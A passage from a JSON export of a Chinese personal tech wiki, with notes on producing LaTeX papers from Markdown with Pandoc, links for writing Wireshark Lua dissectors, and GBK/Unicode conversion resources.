/dev/nullclean: rm main.aux main.tex main.log main.bbl main.blg main.out.PHONY: all clean paper Pandoc 使用下面的标记： -s 创建一个独立的 LaTeX 文档 -F pandoc-crossref 利用 pandoc-crossref 进行过滤 --natbib 用 natbib （你也可以选择 --biblatex）对参考书目进行渲染 --template 设置使用的模板文件 -N 为章节的标题编号 -f 和 -t 指定从哪个格式转换到哪个格式。-t 通常包含格式和 Pandoc 使用的扩展。在这个例子中，我们标明的 raw_tex+tex_math_dollars+citations 允许在 Markdown 中使用 raw_tex LaTeX。 tex_math_dollars 让我们能够像在 LaTeX 中一样输入数学符号，citations 让我们可以使用 这个扩展。 要从 LaTeX 产生 PDF，按 来自bibtex 的指导处理参考书目： 1234@pdflatex main.tex &> /dev/null@bibtex main &> /dev/null@pdflatex main.tex &> /dev/null@pdflatex main.tex &> /dev/null 脚本用 @ 忽略输出，并且重定向标准输出和错误到 /dev/null ，因此我们在使用这些命令的可执行文件时不会看到任何的输出。 最终的结果展示如下。这篇文章的库可以在 GitHub 找到： 结论在我看来，研究的重点是协作、思想的传播，以及在任何一个恰好存在的领域中改进现有的技术。许多计算机科学家和工程师使用 LaTeX 文档系统来写论文，它对数学提供了完美的支持。来自社会科学的研究人员似乎更喜欢 DOCX 文档。 当身处不同社区的研究人员一同写一篇论文时，他们首先应该讨论一下他们将要使用哪种格式。然而如果包含太多的数学符号，DOCX 对于工程师来说不会是最简便的选择，LaTeX 对于缺乏编程经验的研究人员来说也有一些问题。就像这篇文章中展示的，Markdown 是一门工程师和社会科学家都很轻易能够使用的语言。 12","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"通用技术","slug":"计算机/通用技术","permalink":"http://wiki.noodlefighter.com/categories/计算机/通用技术/"}]},{"title":"wireshark二次开发","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/通用技术/wireshark二次开发/","text":"captrue options - interface management, pipes, 选择文件 怎么通过管道把数据给到wireshark，这个wiki说得很详细了：https://wiki.wireshark.org/CaptureSetup/Pipes 官方lua说明和参考https://www.wireshark.org/docs/wsdg_html_chunked/wsluarm.htmlhttps://www.wireshark.org/docs/wsdg_html_chunked/wsluarm_modules.html lua插件例子https://yoursunny.com/t/2008/Wireshark-Lua-dissector/https://www.zybuluo.com/natsumi/note/77991（这篇讲得最全）https://www.cnblogs.com/ascii0x03/p/8781643.html tcp粘包https://blog.csdn.net/huolangwangyi/article/details/51010152 命令行加载lua脚本1The command line option -X lua_script:file.lua can be used to load Lua scripts as well. 一个叫ZeroBrane Studio的IDE提供的lua调试方法http://notebook.kulchenko.com/zerobrane/debugging-wireshark-lua-scripts-with-zerobrane-studio lua学习https://blog.csdn.net/cxihu/article/details/78769594https://www.runoob.com/lua/lua-object-oriented.html lua坑http://www.blogjava.net/rockblue1988/archive/2014/12/29/421910.html","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"通用技术","slug":"计算机/通用技术","permalink":"http://wiki.noodlefighter.com/categories/计算机/通用技术/"}]},{"title":"字符编码","date":"2019-06-08T00:00:00.000Z","path":"wiki/计算机/通用技术/字符编码/","text":"Unicode介绍http://utf8everywhere.org/ gbk和unicode转换码表http://www.herongyang.com/gb2312/unicode_gb2312.htmlhttp://www.cnitblog.com/wujian-IT/archive/2007/12/13/37671.htmlhttp://pan.baidu.com/share/link?shareid=2253699327&uk=2986367675 另外，我也想提两点意见，吴兄可以看看。一是，渣渣的猪窝那个字符表有点大，尤其是对于我们嵌入式设备。所以，我用java生成了一个字符表，大概7445条映射，基本包含了目前的常用中文字符，做成静态数组，占内存空间大概29k.可以大大节省设备空间。也可以降低查找时间。二就在算法做些优化，利用HASH表和二分查找结合的方法。取unicode高8位的值作为HASH的键值，这样，一个键下管理256条映射。再使用二分查找，算法复杂度为 O(log256)=8。这样会在算法上又得到了很好的优化。HASH占用1K的内存。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"通用技术","slug":"计算机/通用技术","permalink":"http://wiki.noodlefighter.com/categories/计算机/通用技术/"}]}]}